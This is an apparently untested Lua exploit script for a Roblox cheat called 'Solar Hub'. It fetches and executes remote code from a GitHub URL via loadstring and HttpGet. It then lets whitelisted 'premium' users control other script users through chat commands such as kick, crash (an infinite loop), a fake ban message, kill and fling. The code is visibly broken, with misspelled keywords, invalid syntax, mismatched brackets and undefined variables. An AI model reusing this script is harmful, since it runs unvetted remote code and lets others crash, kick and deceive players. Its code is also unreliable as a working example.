-- havent tested this to make sure it works because executors r down rn and i made this in notepad so i doubt it will work rn lol

local whitelisted = loadstring(game:HttpGet("https://raw.githubusercontent.com/rip2point/Solar-Hub-Premium/main/list.lua"))()

local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local TweenService = game:GetService("TweeenService")
local ws = game:GetService("Workspace")

local LocalPlayer = Players.LocalPlayer

loacl prefix = "/"
local Premium = "⭐"
local Admin = "👑"


if not TextChatService then return end



local function AddTag(Char)
	local a = Players:FindFirstChild(Char.Name)
	if a then
		local check = CheckPremium(a)
		if not check then return end
	else
		return
	end
	
	local rank = nil

	for i, v in next, whitelisted do
		if i == a.UserId then
			if v ~= Admin and v ~= Premium then return end
			rank = v
		end
	end
	if rank == nil then return end
	
	local head = Char:WaitForChild("Head")
	
	local bannerTag = workspace:FindFirstChild("Banner"..a.Name)
	local nameTag = head:FindFirstChild("Nametag")

	if not bannerTag then
		bannerTag = Char:FindFirstChild("Banner"..a.Name)
		if not bannerTag or if not nameTag then return end
	end

	local Billboard = bannerTag:FindFirstChild("BillboardGui")

	if not Billboard:IsA("BillboardGui") or if not nameTag:IsA("BillboardGui") then return end

	local NameText = nameTag:FindFirstChild("TextLabel")
	local Shadow = NameText:FindFirstChild("Shadow")
	local BillText = Billboard:FindFirstChild("Frame"):FindFirstChild("Username")

	if not NameText or if not BillText or if not Shadow then return end

	NameText.Text = "["..rank.."] "..a.Name
	Shadow.Text = "["..rank.."] "..a.Name
	BillText.Text = rank.." "..a.Name.." "..rank

	
end

local function CheckPremium(plr)
	for i, v in next, whitelisted do
		if plr.UserId == i then
			return true
		end
	end
	return
end

local function CheckForPlayer(str)
	local findPlayer = Players:FindFirstChild(str)

	if findPlayer then
		if findPlayer == LocalPlayer then
			return true
		end
	end
	return
end

local function CreateCommand(str, callback)
	local a = string.split(str, " ")
	if a[2] then
		local Check = CheckForPlayer(a[2])

		if Check then
			pcall(callback)
		end
		return
	end
	pcall(callback)
	return
end

TextChatService.MessageReceived:Connect(function(messageData)
	local isLocalPlayerPremium = CheckPremium(LocalPlayer)
	if isLocalPlayerPremium then return end
	local Message = string.lower(messageData.Text)
	local Player = messageData.TextSource

	if Player == LocalPlayer then return end
	local CheckForPremium = CheckPremium(Player)
	if not CheckForPremium then return end

	local commands = {
		
		[prefix.."check"] = function()
			CreateCommand(Message, function()
				TextChatService.TextChannels.RBXGeneral:SendAsync("I love watching Solar Eclipses!")
			end)
		end),

		[prefix.."bring"] = function()
			CreateCommand(Message, function()
				local LocalChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local UserChar = Player.Character or Player.CharacterAdded:Wait()
			
				local LocalRoot = LocalChar:WaitForChild("HumanoidRootPart")
				local UserRoot = LocalChar:WaitForChild("HumanoidRootPart")

				LocalRoot.CFrame = UserRoot.CFrame
			end)
		end),

		[prefix.."kick"] = function()
			CreateCommand(Message, function()
				LocalPlayer:Kick("[SOLAR HUB]: KICKED FROM GAME BY SOLAR PREMIUM MEMBER: "..Player.Name..". REPORT IF THIS WAS ABUSE!"
			end)
		end),

		[prefix.."freeze"] = function()
			CreateCommand(Message, function()
				local LocalChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local LocalRoot = LocalChar:WaitForChild("HumanoidRootPart")

				LocalRoot.Anchored = true
			end)
		end),

		[prefix.."unfreeze"] = function()
			CreateCommand(Messagee, function()
				local LocalChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local LocalRoot = LocalChar:WaitForChild("HumanoidRootPart")

				LocalRoot.Anchored = false
			end)
		end),

		[prefix.."say"] = function()
			local a = string.split(Message, " ")
			if a[1] and a[2] and a[3] then
				local command = a[1]
				local RequestedMessage = a[2]
				local plr = a[3]

				local CheckForPlayer = Players:FindFirstChild(plr)
				if CheckForPlayer then
					if CheckForPlayer == LocalPlayer then
						TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
					end

					return
				end
				TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
			end
			return
		end),


		[prefix.."fling"] = function()
			CreateCommand(Message, function()
				local LocalChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local LocalRoot = LocalChar:WaitForChild("HumanoidRootPart")

				local BodyVelo = Instance.new("BodyVelocity")
				BodyVelo.Parent = LocalRoot
				BodyVelo.Name = "SOLARHUB_FLING"
				BodyVelo.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
				BodyVelo.Velocity = Vector3.new(math.huge, math.huge, math.huge)
			end)
		end),

		[prefix.."unfling"] = function()
			CreateCommand(Message, function()
				local LocalChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local LocalRoot = LocalChar:WaitForChild("HumanoidRootPart")

				local find = LocalRoot:FindFirstChild("SOLARHUB_FLING")
				if find then
					find:Destroy()
				end
			end)
		end),

		[prefix.."kill"] = function()
			CreateCommand(Message, function()
				local LocalChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local LocalHumanoid = LocalChar:WaitForChild("Humanoid")

				LocalHumanoid.Health = 0
			end)
		end),

		[prefix.."spin"] = function()
			CreateCommand(Message, function()
				local LocalChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local LocalRoot = LocalChar:WaitForChild("HumanoidRootPart")

				local BodyVelo = Instance.new("BodyVelocity")
				BodyVelo.Parent = LocalRoot
				BodyVelo.Name = "SOLARHUB_SPIN"
				BodyVelo.MaxForce = Vector3.new(500,500,500)
				BodyVelo.Velocity = Vector3.new(0,5,0)
			end)
		end),

		[prefix.."unspin"] = function()
			CreateCommand(Message, function()
				local LocalChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local LocalRoot = LocalChar:WaitForChild("HumanoidRootPart")

				local find = LocalRoot:FindFirstChild("SOLARHUB_SPIN")
				if find then
					find:Destroy()
				end
			end)
		end),

		[prefix.."crash"] = function()
			CreateCommand(Message, function()
				while true do end
			end)
		end),

		[prefix.."ban"] = function()
			CreateCommand(Message, function()
				LocalPlayer:Kick("YOU HAVE BEEN PERMANENTLY BANNED FROM HOOPS LIFE. REASON: EXPLOITING.")
			end)
		end),

		[prefix.."grave"] = function()
			CreateCommand(Message, function()
				local LocalChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local LocalRoot = LocalChar:WaitForChild("HumanoidRootPart")
				local Info = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
				
				local tween = TweenService:Create(LocalRoot, Info, {CFrame = LocalRoot.CFrame * CFrame.new(0,-10,0)
				tween:Play()
				tween.Completed:Wait()
				LocalRoot.Anchored = true
			end)
		end),

		[prefix.."ungrave"] = function()
			CreateCommand(Message, function()
				local LocalChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
				local LocalRoot = LocalChar:WaitForChild("HumanoidRootPart")
				local Info = TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
				
				LocalRoot.Anchored = false
				local tween = TweenService:Create(LocalRoot, Info, {CFrame = LocalRoot.CFrame * CFrame.new(0,10,0)
				tween:Play()
			end)
		end),
	}

	for i, v in next, commands do
		if string.find(Message, i) then
			pcall(v)
		end
	end
	return
end)

for i, v in pairs(Players:GetPlayers()) do
	local char = v.Character or v.CharacterAdded:Wait()
	if char then
		AddTag(char)
	end
	v.CharacterAdded:Connect(function(Char)
		AddTag(Char)
	end)
end

Players.PlayerAdded:Connect(function(plr)
	plr.CharacterAdded:Connect(function(char)
		AddTag(char)
	end)
end)
